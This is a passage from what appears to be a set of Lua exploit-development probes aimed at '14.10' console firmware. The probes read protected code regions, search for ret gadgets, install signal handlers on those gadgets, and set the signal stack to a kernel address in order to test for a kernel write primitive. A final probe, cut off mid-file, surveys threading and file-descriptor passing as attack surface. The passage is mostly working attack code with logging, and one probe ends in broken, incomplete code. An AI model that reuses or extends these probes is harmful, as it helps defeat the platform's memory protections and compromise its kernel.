            -- PART 4: KERNEL ALTSTACK + RET GADGET
            -- ==============================================
            log("")
            log("--- PART 4: KERNEL ALTSTACK ---")

            memory.write_dword(ss_new + 16, 4)
            pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

            memory.write_dword(ss_new, 0x10000000)
            memory.write_dword(ss_new + 4, 0xFFFFF800)
            memory.write_qword(ss_new + 8, STACK_SZ)
            memory.write_dword(ss_new + 16, 0)
            local kss = pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
            log("  set kernel DMAP altstack: " .. tostring(kss))

            log("  sending SIGUSR1 to kernel altstack...")
            local k2_ok, k2_ret = pcall(function()
                return syscall.sc_kill(pid, 30)
            end)
            log("  kill rv=" .. (k2_ok and tostring(k2_ret:tonumber()) or "ERR"))

            local alive2 = pcall(function() return syscall.sc_getpid() end)
            log("  alive: " .. tostring(alive2))

            memory.write_dword(ss_new + 16, 4)
            pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
        end
    end
else
    log("  no gadget available, skipping handler test")
end

-- Cleanup
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
memory.write_dword(ss_new + 16, 4)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

log("")
log("=== W^X GADGET DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
```

## probes/phase3_signals_codexec/26d_find_ret.lua

```lua
-- 14.10 Recon Probe 26d: Find ret gadget in existing code
-- mprotect PROT_EXEC is blocked — can't create executable code
-- mmap RX gives executable zero page — useless
-- Need to find existing 0xC3 in the process's code segment
--
-- memory.read_byte with mmap'd RX page worked (read 0x00)
-- So we CAN read executable pages if we have a valid pointer
-- The crash in probe 26 was likely from passing a raw integer
--
-- Strategy: mmap at a FIXED address overlapping the code segment?
-- Or: use the RX mmap page's pointer arithmetic to reach code?
--
-- Actually simpler: memory.alloc returns pointers in the heap.
-- If we can compute an offset from heap to code, we can read code.
-- Or we can try reading via the RX page's base.
--
-- Alternative: the Lua API might support memory.read at arbitrary
-- addresses if we construct a pointer correctly.

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: FIND RET ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_mmap = 477,
    sc_munmap = 73,
    sc_sigaction = 416,
    sc_sigaltstack = 53,
    sc_kill = 37,
    sc_getpid = 20,
})

local pid = syscall.sc_getpid():tonumber()

-- ============================================================
-- PART 1: Understand pointer types and address layout
-- ============================================================
log("")
log("--- PART 1: address layout ---")

local heap1 = memory.alloc(64)
local heap2 = memory.alloc(64)
log(string.format("  heap1: 0x%x", heap1:tonumber()))
log(string.format("  heap2: 0x%x", heap2:tonumber()))

-- The crash handler is at 0x533118f4
-- Heap is probably in the 0x3xxxxxxxx range (from mmap results)
-- Let's see if we can do pointer arithmetic to reach code

-- Test: can we add a large offset to a heap pointer?
local heap_addr = heap1:tonumber()
local code_addr = 0x533118f4
local offset = code_addr - heap_addr
log(string.format("  crash handler: 0x%x", code_addr))
log(string.format("  offset to code: 0x%x (%d)", offset, offset))

-- Try reading with offset from heap pointer
local rd_ok, rd_val = pcall(function()
    return memory.read_byte(heap1 + offset):tonumber()
end)
log("  read code via offset: " .. (rd_ok and string.format("0x%02x", rd_val) or "FAIL"))

-- ============================================================
-- PART 2: If code readable, scan for ret near crash handler
-- ============================================================
log("")
log("--- PART 2: scan for ret ---")

if rd_ok then
    log("  *** CODE IS READABLE via pointer arithmetic ***")
    local code_base = heap1 + offset
    local rets = {}

    -- Scan crash handler region: -16 to +512
    for i = -16, 512 do
        local s_ok, s_val = pcall(function()
            return memory.read_byte(code_base + i):tonumber()
        end)
        if s_ok and s_val == 0xC3 then
            rets[#rets+1] = {off = i, addr = code_addr + i}
            log(string.format("  RET at 0x%x (handler+%d)", code_addr + i, i))
        end
    end
    log("  found " .. #rets .. " ret instructions")

    -- Also look for function epilogues
    for i = -16, 512 do
        local ok1, v1 = pcall(function() return memory.read_byte(code_base + i):tonumber() end)
        local ok2, v2 = pcall(function() return memory.read_byte(code_base + i + 1):tonumber() end)
        if ok1 and ok2 and v2 == 0xC3 then
            if v1 == 0x5D then -- pop rbp; ret
                log(string.format("  POP_RBP;RET at 0x%x", code_addr + i))
            elseif v1 == 0xC9 then -- leave; ret
                log(string.format("  LEAVE;RET at 0x%x", code_addr + i))
            end
        end
    end

    -- ============================================================
    -- PART 3: Test first ret gadget as signal handler
    -- ============================================================
    if #rets > 0 then
        log("")
        log("--- PART 3: test ret gadget ---")

        local gadget_off = rets[1].off
        local gadget_ptr = code_base + gadget_off -- pointer to the ret
        -- But we need the ADDRESS as an integer for sigaction
        local gadget_addr_int = rets[1].addr
        log(string.format("  using gadget at 0x%x", gadget_addr_int))

        -- Set up user altstack
        local STACK_SZ = 32768
        local test_stack = memory.alloc(STACK_SZ)
        for i = 0, STACK_SZ - 4, 4 do
            memory.write_dword(test_stack + i, 0x66660000 + i)
        end

        local ss_new = memory.alloc(32)
        local ss_old = memory.alloc(32)
        memory.write_qword(ss_new, test_stack)
        memory.write_qword(ss_new + 8, STACK_SZ)
        memory.write_dword(ss_new + 16, 0)
        pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

        -- Set SIGUSR1 handler to ret gadget
        local sa_new = memory.alloc(64)
        local sa_old = memory.alloc(64)
        for i = 0, 63, 8 do memory.write_qword(sa_new + i, 0) end
        local g_lo = gadget_addr_int % 0x100000000
        local g_hi = math.floor(gadget_addr_int / 0x100000000)
        memory.write_dword(sa_new, g_lo)
        memory.write_dword(sa_new + 4, g_hi)
        memory.write_dword(sa_new + 8, 0x0001 + 0x0040) -- SA_ONSTACK|SA_SIGINFO
        pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

        log("  sending SIGUSR1 to ret gadget...")
        local k_ok, k_ret = pcall(function() return syscall.sc_kill(pid, 30) end)
        log("  kill rv=" .. (k_ok and tostring(k_ret:tonumber()) or "ERR"))

        local alive = pcall(function() return syscall.sc_getpid() end)
        log("  alive: " .. tostring(alive))

        if alive then
            local modified = 0
            local first_mod = -1
            for i = 0, STACK_SZ - 4, 4 do
                local v = memory.read_dword(test_stack + i):tonumber()
                if v ~= 0x66660000 + i then
                    modified = modified + 1
                    if first_mod < 0 then first_mod = i end
                end
            end
            log("  altstack modified: " .. modified)

            if modified > 0 then
                log("  *** RET GADGET WORKS — SIGNAL FRAME ON ALTSTACK ***")
                log(string.format("  frame starts at +%d", first_mod))

                -- Dump frame looking for kernel pointers
                for i = first_mod, math.min(first_mod + 384, STACK_SZ - 8), 8 do
                    local lo = memory.read_dword(test_stack + i):tonumber()
                    local hi = memory.read_dword(test_stack + i + 4):tonumber()
                    if hi ~= 0x66660000 + i + 4 or lo ~= 0x66660000 + i then
                        local tag = ""
                        if hi >= 0xFFFF0000 then tag = " ***KPTR***" end
                        if hi >= 0x00000053 and hi <= 0x00000054 then tag = " (code?)" end
                        log(string.format("    +%04x: 0x%08x%08x%s", i, hi, lo, tag))
                    end
                end

                -- ==========================================
                -- PART 4: KERNEL ALTSTACK + RET GADGET
                -- ==========================================
                log("")
                log("--- PART 4: KERNEL ALTSTACK ---")

                memory.write_dword(ss_new + 16, 4) -- SS_DISABLE
                pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

                memory.write_dword(ss_new, 0x10000000)
                memory.write_dword(ss_new + 4, 0xFFFFF800)
                memory.write_qword(ss_new + 8, STACK_SZ)
                memory.write_dword(ss_new + 16, 0)
                local kss = pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
                log("  set kernel DMAP altstack: " .. tostring(kss))

                log("  *** SENDING SIGUSR1 WITH KERNEL ALTSTACK ***")
                local k2_ok, k2_ret = pcall(function()
                    return syscall.sc_kill(pid, 30)
                end)
                log("  kill rv=" .. (k2_ok and tostring(k2_ret:tonumber()) or "ERR"))

                local alive2 = pcall(function() return syscall.sc_getpid() end)
                log("  alive: " .. tostring(alive2))

                if alive2 then
                    log("  *** SURVIVED — copyout validated or wrote to kernel ***")
                else
                    log("  KILLED — kernel detected bad stack or wrote and crashed")
                end

                memory.write_dword(ss_new + 16, 4)
                pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
            end
        else
            log("  CRASHED — gadget didn't return cleanly")
            log("  trying next gadget...")
        end

        -- Cleanup
        for i = 0, 63, 8 do memory.write_qword(sa_new + i, 0) end
        pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
        memory.write_dword(ss_new + 16, 4)
        pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
    end
else
    log("  code NOT readable via pointer arithmetic")
    log("  trying MAP_FIXED to overlay code region...")

    -- Try mmap MAP_FIXED at crash handler page to get readable mapping
    local MAP_FIXED = 0x0010
    local code_page = 0x53311000 -- page containing 0x533118f4
    local mf_ok, mf_ret = pcall(function()
        return syscall.sc_mmap(code_page, 4096, 1 + 4, -- PROT_READ|PROT_EXEC
            MAP_PRIVATE + MAP_ANON + MAP_FIXED, -1, 0)
    end)
    log("  MAP_FIXED at code page: " ..
        (mf_ok and string.format("0x%x", mf_ret:tonumber()) or "ERR"))
end

log("")
log("=== FIND RET DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
```

```lua
-- 14.10 Recon Probe 26e: Read code segment to find ret gadget
-- Problem: heap (0x310xxx) > code (0x53xxx), so offset is negative
-- Pointer + negative offset crashes
-- Fix: mmap at a LOW hint address to get a base below code,
-- then use positive offset to read code bytes

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: CODE READ ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_mmap = 477,
    sc_munmap = 73,
    sc_sigaction = 416,
    sc_sigaltstack = 53,
    sc_kill = 37,
    sc_getpid = 20,
})

local pid = syscall.sc_getpid():tonumber()
local PROT_READ = 1
local PROT_WRITE = 2
local MAP_PRIVATE = 2
local MAP_ANON = 0x1000

-- ============================================================
-- PART 1: Try mmap with low hint addresses
-- ============================================================
log("")
log("--- PART 1: low mmap hints ---")

-- Try several low hints — kernel may or may not honor them
local hints = {0x10000, 0x100000, 0x1000000, 0x10000000, 0x20000000}
local low_ptr = nil
local low_addr = nil

for _, hint in ipairs(hints) do
    local ok, ptr = pcall(function()
        return syscall.sc_mmap(hint, 4096, PROT_READ + PROT_WRITE,
            MAP_PRIVATE + MAP_ANON, -1, 0)
    end)
    if ok then
        local addr = ptr:tonumber()
        log(string.format("  hint 0x%x → 0x%x", hint, addr))
        if addr > 0 and addr < 0x533118f4 then
            if not low_ptr or addr < low_addr then
                low_ptr = ptr
                low_addr = addr
            end
        end
        -- Unmap if not useful
        if addr >= 0x533118f4 then
            pcall(function() syscall.sc_munmap(ptr, 4096) end)
        end
    end
end

if low_ptr then
    log(string.format("  best low ptr: 0x%x", low_addr))
    local code_target = 0x533118f4
    local offset = code_target - low_addr
    log(string.format("  offset to crash handler: 0x%x (%d)", offset, offset))

    -- Try reading from code
    local rd_ok, rd_val = pcall(function()
        return memory.read_byte(low_ptr + offset):tonumber()
    end)
    log("  read crash_handler[0]: " ..
        (rd_ok and string.format("0x%02x", rd_val) or "FAIL"))

    if rd_ok then
        log("  *** CODE READABLE ***")

        -- Scan for ret (0xC3) near crash handler
        local rets = {}
        local scan_start = -32
        local scan_end = 1024

        for i = scan_start, scan_end do
            local s_ok, s_val = pcall(function()
                return memory.read_byte(low_ptr + offset + i):tonumber()
            end)
            if s_ok and s_val == 0xC3 then
                rets[#rets+1] = {off = i, addr = code_target + i}
            end
        end

        log("  found " .. #rets .. " ret instructions in range")
        for idx, r in ipairs(rets) do
            if idx <= 10 then
                -- Check preceding byte for epilogue pattern
                local pre_ok, pre_val = pcall(function()
                    return memory.read_byte(low_ptr + offset + r.off - 1):tonumber()
                end)
                local pattern = ""
                if pre_ok then
                    if pre_val == 0x5D then pattern = " (pop rbp;ret)"
                    elseif pre_val == 0xC9 then pattern = " (leave;ret)"
                    elseif pre_val == 0x90 then pattern = " (nop;ret)"
                    elseif pre_val == 0xC3 then pattern = " (ret;ret)"
                    end
                end
                log(string.format("    0x%x (handler%+d)%s",
                    r.addr, r.off, pattern))
            end
        end

        -- Dump first 32 bytes of crash handler for context
        log("")
        log("  crash handler bytes:")
        local hex = {}
        for i = 0, 31 do
            local b_ok, b_val = pcall(function()
                return memory.read_byte(low_ptr + offset + i):tonumber()
            end)
            if b_ok then hex[#hex+1] = string.format("%02x", b_val) end
        end
        log("  " .. table.concat(hex, " "))

        -- ============================================================
        -- PART 2: Test first clean ret gadget as signal handler
        -- Prefer "pop rbp; ret" or standalone "ret"
        -- ============================================================
        if #rets > 0 then
            log("")
            log("--- PART 2: test ret gadget ---")

            -- Pick best gadget: prefer standalone ret or pop rbp;ret
            local best = rets[1]
            for _, r in ipairs(rets) do
                local pre_ok, pre_val = pcall(function()
                    return memory.read_byte(low_ptr + offset + r.off - 1):tonumber()
                end)
                if pre_ok and pre_val == 0x5D then
                    best = r -- pop rbp; ret is a clean epilogue
                    break
                end
            end

            log(string.format("  using gadget at 0x%x", best.addr))

            local STACK_SZ = 32768
            local test_stack = memory.alloc(STACK_SZ)
            for i = 0, STACK_SZ - 4, 4 do
                memory.write_dword(test_stack + i, 0x77770000 + i)
            end

            local ss_new = memory.alloc(32)
            local ss_old = memory.alloc(32)
            memory.write_qword(ss_new, test_stack)
            memory.write_qword(ss_new + 8, STACK_SZ)
            memory.write_dword(ss_new + 16, 0)
            pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

            local sa_new = memory.alloc(64)
            local sa_old = memory.alloc(64)
            for i = 0, 63, 8 do memory.write_qword(sa_new + i, 0) end
            local g_lo = best.addr % 0x100000000
            local g_hi = math.floor(best.addr / 0x100000000)
            memory.write_dword(sa_new, g_lo)
            memory.write_dword(sa_new + 4, g_hi)
            memory.write_dword(sa_new + 8, 0x0001 + 0x0040) -- SA_ONSTACK|SA_SIGINFO
            pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

            log("  sending SIGUSR1...")
            local k_ok, k_ret = pcall(function()
                return syscall.sc_kill(pid, 30)
            end)
            log("  kill rv=" .. (k_ok and tostring(k_ret:tonumber()) or "ERR"))

            local alive = pcall(function() return syscall.sc_getpid() end)
            log("  alive: " .. tostring(alive))

            if alive then
                local modified = 0
                local first_mod = -1
                for i = 0, STACK_SZ - 4, 4 do
                    local v = memory.read_dword(test_stack + i):tonumber()
                    if v ~= 0x77770000 + i then
                        modified = modified + 1
                        if first_mod < 0 then first_mod = i end
                    end
                end
                log("  altstack modified: " .. modified)

                if modified > 0 then
                    log("  *** CLEAN RET WORKS — FRAME ON ALTSTACK ***")
                    log(string.format("  frame at +%d", first_mod))

                    -- Dump frame for kernel pointers
                    for i = first_mod, math.min(first_mod + 320, STACK_SZ - 8), 8 do
                        local lo = memory.read_dword(test_stack + i):tonumber()
                        local hi = memory.read_dword(test_stack + i + 4):tonumber()
                        if hi ~= 0x77770000 + i + 4 or lo ~= 0x77770000 + i then
                            local tag = ""
                            if hi >= 0xFFFF0000 then tag = " ***KPTR***" end
                            log(string.format("    +%04x: 0x%08x%08x%s",
                                i, hi, lo, tag))
                        end
                    end

                    -- PART 3: KERNEL ALTSTACK
                    log("")
                    log("--- PART 3: KERNEL ALTSTACK ---")
                    memory.write_dword(ss_new + 16, 4)
                    pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

                    memory.write_dword(ss_new, 0x10000000)
                    memory.write_dword(ss_new + 4, 0xFFFFF800)
                    memory.write_qword(ss_new + 8, STACK_SZ)
                    memory.write_dword(ss_new + 16, 0)
                    pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

                    log("  *** KERNEL ALTSTACK SIGNAL ***")
                    local k2_ok, k2_ret = pcall(function()
                        return syscall.sc_kill(pid, 30)
                    end)
                    log("  kill rv=" ..
                        (k2_ok and tostring(k2_ret:tonumber()) or "ERR"))

                    local alive2 = pcall(function() return syscall.sc_getpid() end)
                    log("  alive: " .. tostring(alive2))

                    memory.write_dword(ss_new + 16, 4)
                    pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
                end
            end

            -- Cleanup
            for i = 0, 63, 8 do memory.write_qword(sa_new + i, 0) end
            pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
            memory.write_dword(ss_new + 16, 4)
            pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
        end
    end
else

    log("  trying MAP_FIXED at 0x10000000...")
    local MAP_FIXED = 0x0010
    local fix_ok, fix_ptr = pcall(function()

    end)

        log(string.format("  MAP_FIXED: 0x%x", fix_ptr:tonumber()))

end
```

## probes/phase3_signals_codexec/26f_kstack_crash.lua

```lua
-- 14.10 Recon Probe 26f: Kernel altstack crash test
-- Can't read code (XOM), can't create code (W^X no mprotect)
-- Can't block signals (sigprocmask broken)
--
-- BUT: we don't need a clean handler to answer the key question!
-- Set crash handler + kernel altstack + send signal
-- If crash handler RUNS: sendsig() delivered the signal, meaning
--   either it wrote to kernel memory (!!!) or fell back to normal stack
-- If process DIES (disconnect): copyout() rejected kernel addr
--
-- We test with TWO signals back to back:
-- 1. Crash handler + USER altstack → should get binary garbage (baseline)
-- 2. Crash handler + KERNEL altstack → crash test
--
-- Compare: if both produce crash handler output, the kernel falls back.
-- If #2 kills the process, copyout() validates the address.
--
-- IMPORTANT: do the kernel test LAST since it may kill the process

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: KSTACK CRASH TEST ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_sigaction = 416,
    sc_sigaltstack = 53,
    sc_kill = 37,
    sc_getpid = 20,
})

local SA_SIZE = 64
local sa_new = memory.alloc(SA_SIZE)
local sa_old = memory.alloc(SA_SIZE)
local ss_new = memory.alloc(32)
local ss_old = memory.alloc(32)
local pid = syscall.sc_getpid():tonumber()
local STACK_SZ = 32768
local SS_DISABLE = 4

-- ============================================================
-- PART 1: Info gathering — check what we can learn first
-- ============================================================
log("")
log("--- PART 1: memory layout ---")

local heap = memory.alloc(64)
log(string.format("  heap: 0x%x", heap:tonumber()))

-- mmap a few pages to understand the VA layout
syscall.resolve({ sc_mmap = 477, sc_munmap = 73 })
local low_ok, low_ptr = pcall(function()
    return syscall.sc_mmap(0x10000, 4096, 3, 0x1002, -1, 0)
end)
if low_ok then
    log(string.format("  low mmap: 0x%x", low_ptr:tonumber()))
    pcall(function() syscall.sc_munmap(low_ptr, 4096) end)
end

-- ============================================================
-- PART 2: Kernel altstack with crash handler — THE TEST
-- Skip baseline (we know crash handler works on user altstack)
-- Go straight to kernel altstack
--
-- The crash handler (0x533118f4) will try to run. Two outcomes:
-- A) sendsig() builds frame on kernel altstack via copyout()
--    → copyout() succeeds → handler runs on kernel stack → output
--    → THIS MEANS KERNEL WRITE PRIMITIVE
-- B) sendsig() builds frame, copyout() returns EFAULT
--    → kernel kills process → disconnect, no output
-- C) kernel checks altstack addr BEFORE copyout
--    → falls back to regular stack → handler runs → output
--    → this means we can test but no kernel write
-- ============================================================
log("")
log("--- PART 2: KERNEL ALTSTACK TEST ---")
log("  if you see crash handler output after this: sendsig fell back")
log("  if connection drops: copyout rejected kernel addr")

-- Set kernel DMAP altstack
memory.write_dword(ss_new, 0x10000000)
memory.write_dword(ss_new + 4, 0xFFFFF800)
memory.write_qword(ss_new + 8, STACK_SZ)
memory.write_dword(ss_new + 16, 0)

local kss_ok = pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
log("  set kernel altstack: " .. tostring(kss_ok))

-- Verify
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
local v_lo = memory.read_dword(ss_old):tonumber()
local v_hi = memory.read_dword(ss_old + 4):tonumber()
log(string.format("  verified: 0x%08x%08x", v_hi, v_lo))

-- Set crash handler with SA_ONSTACK
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_dword(sa_new, 0x533118f4)
memory.write_dword(sa_new + 4, 0)
memory.write_dword(sa_new + 8, 0x0001 + 0x0040) -- SA_ONSTACK|SA_SIGINFO
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
log("  handler=0x533118f4 SA_ONSTACK|SA_SIGINFO")

-- Flush output before the dangerous part
log("")
log(">>> SENDING SIGUSR1 WITH KERNEL ALTSTACK <<<")

-- This is the moment of truth
local k_ok, k_ret = pcall(function()
    return syscall.sc_kill(pid, 30)
end)

-- If we reach here, the signal was delivered somehow
log("  *** SURVIVED ***")
log("  kill rv=" .. (k_ok and tostring(k_ret:tonumber()) or "ERR"))

local alive = pcall(function() return syscall.sc_getpid() end)
log("  alive: " .. tostring(alive))

-- If we're still running, it means sendsig() fell back to normal stack
-- (or somehow used the kernel altstack — check for kernel panics later)

-- Check if altstack is still set
local check_ss = memory.alloc(32)
memory.write_dword(ss_new + 16, SS_DISABLE)
pcall(function() syscall.sc_sigaltstack(ss_new, check_ss) end)
local c_lo = memory.read_dword(check_ss):tonumber()
local c_hi = memory.read_dword(check_ss + 4):tonumber()
local c_fl = memory.read_dword(check_ss + 16):tonumber()
log(string.format("  post-signal altstack: 0x%08x%08x flags=0x%x",
    c_hi, c_lo, c_fl))

-- Cleanup
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

log("")
log("=== KSTACK CRASH TEST DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
```

```lua
-- 14.10 Recon Probe 27: Threading + fd attack surface
-- Part 1: Can we create threads? (rfork, thr_new, fork)
-- Part 2: SCM_RIGHTS fd passing via sendmsg/recvmsg
-- Part 3: dup2, fcntl, fstat on various fds
-- Part 4: Socket types (AF_INET, AF_INET6, raw)
-- Part 5: shm_open, mmap shared

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: THREAD + FD SURFACE ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_getpid = 20,
    sc_fork = 2,
    sc_rfork = 251,
    sc_thr_new = 455,
    sc_thr_self = 432,
    sc_thr_exit = 431,
    sc_socketpair = 135,
    sc_socket = 97,
    sc_sendmsg = 28,
    sc_recvmsg = 27,
    sc_close = 6,
    sc_read = 3,
    sc_write = 4,
    sc_dup2 = 90,
    sc_dup = 41,
    sc_fcntl = 92,
    sc_fstat = 551,
    sc_pipe2 = 542,
    sc_open = 5,
    sc_mmap = 477,
    sc_munmap = 73,
    sc_shm_open2 = 571,
    sc_shm_unlink = 483,
    sc_connect = 98,
    sc_bind = 104,
    sc_setsockopt = 105,
    sc_getsockopt = 118,
})

local pid = syscall.sc_getpid():tonumber()

-- ============================================================
-- PART 1: Threading
-- ============================================================
log("")
log("--- PART 1: threading syscalls ---")

-- thr_self — get current thread ID
local ts_ok, ts_ret = pcall(function()
    local tid_buf = memory.alloc(8)
    local rv = syscall.sc_thr_self(tid_buf)
    local tid = memory.read_qword(tid_buf):tonumber()
    return rv:tonumber(), tid
end)
if ts_ok then
    log(string.format("  thr_self: rv=%d tid=%d", ts_ret, select(2, ts_ret) or 0))
else
    -- try simpler
    local tid_buf = memory.alloc(8)
    local t2_ok, t2_ret = pcall(function() return syscall.sc_thr_self(tid_buf) end)
    if t2_ok then
        local tid = memory.read_qword(tid_buf):tonumber()
        log(string.format("  thr_self: rv=%d tid=%d", t2_ret:tonumber(), tid))
    else
        log("  thr_self: FAIL")
    end
end

-- fork — does it work?
local fork_ok, fork_ret = pcall(function() return syscall.sc_fork() end)
if fork_ok then
    local rv = fork_ret:tonumber()
    log(string.format("  fork: rv=%d %s", rv, rv == 0 and "(CHILD!)" or "(parent, child=" .. rv .. ")"))
    -- If rv > 0 we're the parent and child is running
    -- If rv == 0 we're the child (shouldn't happen in Lua context)
    -- If rv == -1 fork failed
else
    log("  fork: CRASH/ERR")
end

-- rfork with RFPROC|RFMEM (shared memory fork = thread-like)
local RFPROC = 0x10
local RFMEM = 0x20
local RFNOWAIT = 0x40
local RFTHREAD = 0x2000

local rf_ok, rf_ret = pcall(function()
    return syscall.sc_rfork(RFPROC + RFMEM + RFNOWAIT)
end)
if rf_ok then
    local rv = rf_ret:tonumber()
    log(string.format("  rfork(PROC|MEM|NOWAIT): rv=%d", rv))
else
    log("  rfork: CRASH/ERR")
end

-- thr_new — create a new thread
-- Needs a stack and entry point — dangerous without executable memory
-- Just test if the syscall is reachable (will fail with bad args)
local thr_param = memory.alloc(128)
for i = 0, 127, 8 do memory.write_qword(thr_param + i, 0) end
-- Set a minimal param: start_func=1 (will fail but shows if syscall works)
memory.write_qword(thr_param, 1)  -- start_func
memory.write_qword(thr_param + 8, 0)  -- arg
local thr_stack = memory.alloc(4096)
memory.write_qword(thr_param + 16, thr_stack)  -- stack_base
memory.write_qword(thr_param + 24, 4096)  -- stack_size

local tn_ok, tn_ret = pcall(function() return syscall.sc_thr_new(thr_param, 128) end)
if tn_ok then
    log(string.format("  thr_new: rv=%d", tn_ret:tonumber()))
else
    log("  thr_new: CRASH/ERR")
end

-- ============================================================
-- PART 2: SCM_RIGHTS fd passing
-- ============================================================
log("")
log("--- PART 2: SCM_RIGHTS ---")

-- Create two socketpairs: one for communication, one fd to pass
local sp1 = memory.alloc(8)
local sp2 = memory.alloc(8)

pcall(function() syscall.sc_socketpair(1, 1, 0, sp1) end) -- AF_UNIX, SOCK_STREAM
pcall(function() syscall.sc_socketpair(1, 1, 0, sp2) end)

local fd1a = memory.read_dword(sp1):tonumber()
local fd1b = memory.read_dword(sp1 + 4):tonumber()
local fd2a = memory.read_dword(sp2):tonumber()
local fd2b = memory.read_dword(sp2 + 4):tonumber()
log(string.format("  pair1: %d,%d  pair2: %d,%d", fd1a, fd1b, fd2a, fd2b))

-- Build sendmsg with SCM_RIGHTS to pass fd2a over pair1
-- struct msghdr {
--   void *msg_name;        // +0, 8
--   socklen_t msg_namelen; // +8, 4
--   // pad 4
--   struct iovec *msg_iov; // +16, 8
--   int msg_iovlen;        // +24, 4 (size_t on 64-bit = 8)
--   // actually msg_iovlen is size_t = 8 bytes on amd64
--   void *msg_control;     // +32, 8  (offset may vary)
--   socklen_t msg_controllen; // +40, 4 (size_t = 8)
--   int msg_flags;         // +48, 4
-- }
-- FreeBSD amd64 msghdr:
--   msg_name: 8, msg_namelen: 4, pad: 4,
--   msg_iov: 8, msg_iovlen: 8,
--   msg_control: 8, msg_controllen: 8,
--   msg_flags: 4
-- Total: ~52 bytes

local msghdr = memory.alloc(64)
local iov = memory.alloc(16)
local iov_buf = memory.alloc(16)
local cmsg_buf = memory.alloc(64) -- control message buffer

-- IOV: one byte payload
memory.write_byte(iov_buf, 0x42)
memory.write_qword(iov, iov_buf)     -- iov_base
memory.write_qword(iov + 8, 1)       -- iov_len

-- CMSG: SCM_RIGHTS with one fd
-- struct cmsghdr { cmsg_len (8), cmsg_level (4), cmsg_type (4) }
-- followed by data (the fd, 4 bytes)
-- CMSG_LEN for 1 fd = sizeof(cmsghdr) + sizeof(int) = 16 + 4 = 20
-- CMSG_SPACE = aligned = 24
local SCM_RIGHTS = 1
local SOL_SOCKET = 0xFFFF
local CMSG_HDR_SZ = 16  -- FreeBSD amd64: cmsg_len(4 or 8?) + level(4) + type(4)
-- Actually on FreeBSD amd64: cmsg_len is socklen_t = 4 bytes
-- struct cmsghdr { socklen_t cmsg_len; int cmsg_level; int cmsg_type; }
-- = 4 + 4 + 4 = 12 bytes header
-- But CMSG_DATA alignment: CMSG_ALIGN(sizeof(struct cmsghdr)) = 16? or 12?
-- On FreeBSD amd64 with _LP64: cmsg_len is __socklen_t = __uint32_t = 4
-- sizeof(struct cmsghdr) = 12, CMSG_ALIGN(12) = 16 (aligned to 8)
-- Wait, CMSG_ALIGN on FreeBSD rounds up to sizeof(long) = 8
-- CMSG_ALIGN(12) = 16
-- CMSG_LEN(4) = CMSG_ALIGN(sizeof(cmsghdr)) + 4 = 16 + 4 = 20
-- CMSG_SPACE(4) = CMSG_ALIGN(CMSG_LEN(4)) = CMSG_ALIGN(20) = 24

-- Actually let me be more careful. FreeBSD:
-- #define CMSG_ALIGN(n) (((n) + __DARWIN_ALIGNBYTES) & ~__DARWIN_ALIGNBYTES)
-- No that's macOS. FreeBSD:
-- #define _ALIGN(p) (((u_int)(p) + (sizeof(long) - 1)) & ~(sizeof(long) - 1))
-- sizeof(long) on amd64 = 8
-- _ALIGN(12) = (12 + 7) & ~7 = 16
-- CMSG_DATA(cmsg) = (unsigned char *)(cmsg) + _ALIGN(sizeof(struct cmsghdr))
-- = cmsg + 16
-- CMSG_LEN(datalen) = _ALIGN(sizeof(struct cmsghdr)) + datalen = 16 + datalen
-- CMSG_SPACE(datalen) = _ALIGN(_ALIGN(sizeof(struct cmsghdr)) + datalen)
-- = _ALIGN(16 + datalen)

-- For 1 fd (4 bytes):
-- cmsg_len = 16 + 4 = 20
-- CMSG_SPACE = _ALIGN(20) = 24

for i = 0, 63, 8 do memory.write_qword(cmsg_buf + i, 0) end
memory.write_dword(cmsg_buf, 20)            -- cmsg_len = 20
memory.write_dword(cmsg_buf + 4, 0xFFFF)    -- cmsg_level = SOL_SOCKET
memory.write_dword(cmsg_buf + 8, 1)         -- cmsg_type = SCM_RIGHTS
-- fd at offset 16 (CMSG_DATA)
memory.write_dword(cmsg_buf + 16, fd2a)     -- the fd to pass

-- Fill msghdr
